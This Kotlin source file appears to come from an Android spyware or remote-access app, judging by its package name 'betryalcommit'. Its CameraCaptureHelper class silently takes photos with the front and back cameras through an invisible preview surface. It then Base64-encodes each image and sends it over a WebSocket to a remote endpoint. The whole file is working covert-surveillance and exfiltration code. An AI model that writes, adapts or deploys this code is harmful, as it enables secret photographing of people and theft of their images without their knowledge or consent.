package com.example.betryalcommit

import android.content.Context
import android.graphics.SurfaceTexture
import android.hardware.Camera
import android.util.Base64
import android.util.Log
import okhttp3.WebSocket
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import kotlin.random.Random

class CameraCaptureHelper {
    fun captureback(context: Context,webSocket: WebSocket) {


        val file = File.createTempFile("Camera_back-  ${Random}  -  ", ".png")
        val holder = SurfaceTexture(0)
        val camera = Camera.open(0)

        try{
        camera.setPreviewTexture(holder)
        camera.startPreview()
        camera.takePicture(
            null,
            null,
        ) { p0, p1 ->
            try {
                FileOutputStream(file).use { outputStream ->
                    outputStream.write(p0)
                }
                p1.release()
                val updata =  Base64.encodeToString(file.readBytes(), Base64.DEFAULT);
                val msg = JSONObject()
                msg.put("type", "image")
                msg.put("data", updata)
                webSocket.send(msg.toString())
            } catch (e: Exception) {
                e.printStackTrace()
            } finally {
                camera.release()
            }
        }
    }catch (e:Exception){
            Log.e("error",e.toString())
        }
    }


    fun capturefront(context: Context,webSocket: WebSocket) {
        val pictureSize: Camera.Size? = getBestPictureSize()
        if (pictureSize == null) {
            return
        }

        val file = File.createTempFile("Camera_${System.currentTimeMillis()}", ".png")

        val holder = SurfaceTexture(0)
        val camera = Camera.open(1)

        try {
            camera.setPreviewTexture(holder)
            val params = camera.parameters
            params.setPictureSize(pictureSize.width, pictureSize.height)
            camera.parameters = params

            camera.startPreview()

            camera.takePicture(null, null) { data, camera ->
                try {
                    FileOutputStream(file).use { outputStream ->
                        outputStream.write(data)
                    }

                    val updata = Base64.encodeToString(file.readBytes(), Base64.DEFAULT)
                    val msg = JSONObject()
                    msg.put("type", "image")
                    msg.put("data", updata)
                    webSocket.send(msg.toString())
                } catch (e: Exception) {
                    e.printStackTrace()
                } finally {
                    camera.release()
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
            camera.release()
        }
    }

    private fun getBestPictureSize(): Camera.Size? {
        val camera = Camera.open(1)
        val parameters = camera.parameters
        val supportedPictureSizes = parameters.supportedPictureSizes

        // You can choose your criteria for selecting the best picture size
        // Here, we'll choose the largest supported size as the best size
        var bestSize: Camera.Size? = null
        var largestArea = 0

        for (size in supportedPictureSizes) {
            val area = size.width * size.height
            if (area > largestArea) {
                largestArea = area
                bestSize = size
            }
        }

        camera.release()
        return bestSize
    }
}